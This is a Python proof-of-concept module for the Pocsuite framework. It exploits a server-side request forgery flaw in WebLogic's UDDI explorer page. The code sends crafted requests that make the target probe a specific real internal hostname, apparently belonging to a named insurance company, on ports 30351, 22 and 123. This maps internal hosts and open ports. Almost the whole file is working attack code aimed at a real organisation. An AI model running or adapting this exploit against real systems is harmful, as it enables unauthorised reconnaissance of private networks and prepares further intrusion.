#!/usr/bin/env python
# coding: utf-8
from pocsuite.lib.core.enums import CUSTOM_LOGGING
from pocsuite.lib.core.log import LOGGER
from pocsuite.lib.core.poc import POCBase, Output
from pocsuite.lib.core.register import registerPoc
from pocsuite.thirdparty import requests

_print = lambda msg: LOGGER.log(CUSTOM_LOGGING.SYSINFO, msg)


class SSRFPOC(POCBase):
    vulID = 'WooYun-2015-137807'  # ssvid
    version = '???'
    author = ['jsj']
    vulDate = '2018-05-22'
    createDate = '2018-05-22'
    updateDate = '2018-05-22'
    references = ['???']
    name = 'SSRF VUL'
    appPowerLink = '???'
    appName = 'BEA WebLogic Server'
    appVersion = '???'
    vulType = '设计缺陷/逻辑错误'
    desc = '''
       中国平安直通保险主站存在SSRF漏洞，导致内网主机探测和端口扫描
    '''

    def base(self):

        info = {"urls": []}
        vul_url = self.url + "/uddiexplorer/SearchPublicRegistries.jsp"
        ssrf_url = self.url + "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://pa18-padwebDMZ9115.instance.paic.com.cn:30351&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search"
        url_p_22 = self.url + "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://pa18-padwebDMZ9115.instance.paic.com.cn:22&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search"
        url_p_123 = self.url + "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://pa18-padwebDMZ9115.instance.paic.com.cn:123&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search"

        index_page = requests.get(self.url)
        _print("{} <-- {}".format(index_page.status_code, index_page.url))
        if index_page.status_code != 200:
            return "Can not connect the tartget!"

        vul_page = requests.get(vul_url, cookies=index_page.cookies, headers=index_page.headers)
        _print("{} <-- {}".format(vul_page.status_code, vul_page.url))
        if vul_page.status_code == 200:
            info["urls"].append(vul_page.url)
        #
        # port 30351
        #
        ssrf_page = requests.get(ssrf_url, cookies=index_page.cookies, headers=index_page.headers)
        _print("{} <-- {}".format(ssrf_page.status_code, ssrf_page.url))
        if ssrf_page.status_code == 200:
            info["urls"].append(ssrf_page.url)
        #
        # port 22
        #
        page_22 = requests.get(url_p_22, cookies=index_page.cookies, headers=index_page.headers)
        _print("{} <-- {}".format(page_22.status_code, page_22.url))
        if page_22.status_code == 200:
            info["urls"].append(page_22.url)
        #
        # port 123
        #
        page_123 = requests.get(url_p_123, cookies=index_page.cookies, headers=index_page.headers)
        _print("{} <-- {}".format(page_123.status_code, page_123.url))
        if page_123.status_code == 200:
            info["urls"].append(page_123.url)
        if info["urls"]:
            return info
        else:
            return "There is not VUL on the target."

    def _attack(self):
        _print("attack ...")
        result = Output(self)
        info = self.base()
        if isinstance(info, dict):
            result.success({"AttackInfo": info})
        else:
            LOGGER.log(CUSTOM_LOGGING.WARNING, info)
            result.fail(info)
        return result

    def _verify(self):
        _print("verify ...")
        result = Output(self)
        info = self.base()
        if isinstance(info, dict):
            result.success({"VerifyInfo": info})
        else:
            LOGGER.log(CUSTOM_LOGGING.WARNING, info)
            result.fail(info)
        return result


register = registerPoc(SSRFPOC)
